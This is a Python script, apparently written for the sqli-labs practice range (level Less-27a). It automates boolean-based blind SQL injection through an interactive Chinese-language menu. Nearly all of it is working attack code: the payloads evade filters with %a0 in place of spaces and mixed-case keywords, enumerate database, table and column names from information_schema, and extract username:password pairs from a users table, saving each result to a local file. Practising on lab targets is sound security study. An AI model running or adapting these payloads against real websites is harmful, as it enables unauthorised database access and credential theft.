import sys

import requests

# 将url 替换成你的靶场关卡网址
# 修改两个对应的payload

# 目标网址（不带参数）
# url = "http://192.168.18.139:7766/Less-27a/"
# 猜解长度使用的payload


# 获取长度
def getLength(url, payload_len):
    length = 1  # 初始测试长度为1
    while True:
        response = requests.get(url=url + payload_len.format(n=length))
        # 页面中出现此内容则表示成功
        if 'Your Login name' in response.text:
            print('测试长度完成，长度为：', length, )
            return length;
        else:
            print('正在测试长度：', length)
            length += 1  # 测试长度递增

# 获取字符
def getStr(url, payload_str, length):
    str = ''  # 初始表名/库名为空
    # 第一层循环，截取每一个字符
    for l in range(1, length + 1):
        # 第二层循环，枚举截取字符的每一种可能性
        for n in range(33, 126):
            response = requests.get(url=url + payload_str.format(l=l, n=n))
            # print('我正在猜解', n)
            # 页面中出现此内容则表示成功
            if 'Your Login name' in response.text:
                str += chr(n)
                print('第', l, '个字符猜解成功：', str)
                break;
    return str;


def before_start() -> None:
    print("colincora,欢迎您的使用\n")
    print("本人Q3300519161\n")

    print("\n且确认以下须知与功能介绍:")
    print("1.本项目用于技术科普，教育与研究用途，请勿用于商业甚至非法用途，否则一切后果自负。")
    print("2.项目不能完全保证不被系统识别异常，请理性使用")
    print("3.项目功能均采用发送GET/POST请求包完成，效率更高且占用资源低")
    print("4.项目接口随时挂，维护看心情\n")

    print("""            _ _                           
   ___ ___ | (_)_ __   ___ ___  _ __ __ _ 
  / __/ _ \| | | '_ \ / __/ _ \| '__/ _` |
 | (_| (_) | | | | | | (_| (_) | | | (_| |
  \___\___/|_|_|_| |_|\___\___/|_|  \__,_|
                colincora
                                          """)
    input("\n回车确认后正式使用本软件:")

def choice(key,url):
    if key==1:
        database(url)
        print("输入q返回菜单")
        a=input()
        if a=='q':
            caidan(url)
    elif key==2:
        database_name=input("请输入要爆破表的数据库名")
        table_name(url,database_name)
        print("输入q返回菜单")
        a = input()
        if a == 'q':
            caidan(url)
    elif key==3:
        database_name=input("请输入要爆破表的数据库名")
        table_name1=input("请输入要爆破字段的表名")
        table_ziduan(url,database_name,table_name1)
        print("输入q返回菜单")
        a = input()
        if a == 'q':
            caidan(url)
    elif key==4:
        database_name=input("请输入要进行字段内容破解的数据库")
        ziduan(url,database_name)
        print("输入q返回菜单")
        a = input()
        if a == 'q':
            caidan(url)
    else:
        sys.exit(0)

#爆破数据库名字
def database(url):
    payload_len = """?id=1"and%a0
    	length(
    		(SELEct%a0group_concat(schema_name)
from%a0information_schema.schemata)
    	)={n}
    %a0and"1"""
    # 枚举字符使用的payload
    payload_str = """?id=1"and%a0
    	ascii(
    		substr(
    			(SELEct%a0group_concat(schema_name)
from%a0information_schema.schemata)
    		,{l},1)
    	)={n}
    %a0and"1"""
    length = getLength(url, payload_len)
    str1=getStr(url, payload_str, length)
    print(str1)
    str1_list=str1.split(',')
    for item in str1_list:
        f=open("数据库名.txt",mode="a",encoding="utf-8")
        f.write(f"{item}\n")
        f.close()

#爆破表名
def table_name(url,database_name):
    payload_len = f"""?id=1"and%a0
        	length(
        		(SELEct%a0group_concat(table_name)
from%a0information_schema.tables%a0
where%a0table_schema='{database_name}')
        	)
        	"""+"""={n}
        %a0and"1"""
    # 枚举字符使用的payload
    payload_str = f"""?id=1"and%a0
        	ascii(
        		substr(
        			(SELEct%a0group_concat(table_name)
from%a0information_schema.tables%a0
where%a0table_schema='{database_name}')
"""+"""
        		,{l},1)
        	)={n}
        %a0and"1"""
    length = getLength(url, payload_len)
    str1 = getStr(url, payload_str, length)
    print(str1)
    str1_list = str1.split(',')
    for item in str1_list:
        f = open("数据表名.txt", mode="a", encoding="utf-8")
        f.write(f"{item}\n")
        f.close()


#爆破字段
def table_ziduan(url,database_name,table_name1):
    payload_len = f"""?id=1"and%a0
            	length(
            		(SELEct%a0group_concat(column_name)
from%a0information_schema.columns%a0
where%a0table_schema='{database_name}'%a0and%a0table_name='{table_name1}')
            	)
            	""" + """={n}
            %a0and"1"""
    # 枚举字符使用的payload
    payload_str = f"""?id=1"and%a0
            	ascii(
            		substr(
            			(SELEct%a0group_concat(column_name)
from%a0information_schema.columns%a0
where%a0table_schema='{database_name}'%a0and%a0table_name='{table_name1}')
    """ + """
            		,{l},1)
            	)={n}
            %a0and"1"""
    length = getLength(url, payload_len)
    str1 = getStr(url, payload_str, length)
    print(str1)
    str1_list = str1.split(',')
    for item in str1_list:
        f = open("数据库字段名.txt", mode="a", encoding="utf-8")
        f.write(f"{item}\n")
        f.close()

#字段内容破解
def ziduan(url,database_name):
    payload_len = f"""?id=1"and%a0
        	length(
        		(SELEct%a0group_concat(username,0x3a,password)%a0from%a0users)
        	)
        	"""+"""={n}
        %a0and"1"""
    # 枚举字符使用的payload
    payload_str = f"""?id=1"and%a0
        	ascii(
        		substr(
        			(SELEct%a0group_concat(username,0x3a,password)%a0from%a0users)
"""+"""
        		,{l},1)
        	)={n}
        %a0and"1"""
    length = getLength(url, payload_len)
    str1 = getStr(url, payload_str, length)
    print(str1)
    str1_list = str1.split(',')
    for item in str1_list:
        f = open("数据库字段内容名.txt", mode="a", encoding="utf-8")
        f.write(f"{item}\n")
        f.close()
def caidan(url):
    print("""
        菜单：
        1.库名爆破
        2.表名爆破
        3.表字段爆破
        4.表内容爆破
        0.退出本程序
                """)
    key = int(input("请输入要执行的命令"))
    choice(key, url)
# 开始猜解
if __name__ == '__main__':
    # before_start()
    # url=input("请输入目标网址：")
    url="http://192.168.18.139:7766/Less-27a/"
    print("""
        菜单：
        1.库名爆破
        2.表名爆破
        3.表字段爆破
        4.表内容爆破
        0.退出本程序
                """)
    key = int(input("请输入要执行的命令"))
    choice(key, url)
    # caidan(url)
    # database(url)
    # length = getLength(url, payload_len)
    # getStr(url, payload_str, length)